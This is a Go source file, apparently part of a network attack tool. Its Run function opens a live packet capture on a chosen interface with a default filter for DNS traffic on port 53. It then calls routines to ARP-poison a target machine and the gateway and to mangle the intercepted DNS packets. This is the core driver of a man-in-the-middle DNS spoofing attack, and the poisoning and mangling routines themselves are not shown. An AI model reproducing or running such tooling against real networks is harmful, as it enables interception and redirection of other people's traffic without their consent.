package SPOOFER

import (
	"fmt"

	"github.com/google/gopacket/pcap"
)

var (
	Interface_Name string
	Berkly_PKT_F   string
	Target_MAC     string
	Gateway_IP     string
	Gateway_MAC    string
)

func Run(sniffc, BPF, target_mac, gateway_IP, gateway_MAC string) {
	if BPF == "" {
		Berkly_PKT_F = "dst port 53"
	} else {
		Berkly_PKT_F = BPF
	}
	Interface_Name = sniffc
	Target_MAC = target_mac
	Gateway_IP = gateway_IP
	Gateway_MAC = gateway_MAC
	handle, x := pcap.OpenLive(Interface_Name, 1600, false, pcap.BlockForever)
	if x != nil {
		fmt.Println("\033[38;5;55m|\033[38;5;31m-\033[38;5;55m| Error -> Got error when trying to open a new listener on the given interface", x)
	} else {
		x = handle.SetBPFFilter(Berkly_PKT_F)
		if x != nil {
			fmt.Println("\033[38;5;55m|\033[38;5;31m-\033[38;5;55m| Error -> Got error when trying to set a new BPF ( Berkly Packet Filter ) on card and listener -> ", x)
		} else {
			defer handle.Close()
			interip(Interface_Name)
			arpPoison(Target_MAC, Gateway_IP, Gateway_MAC)
			Mangle()
		}
	}
}
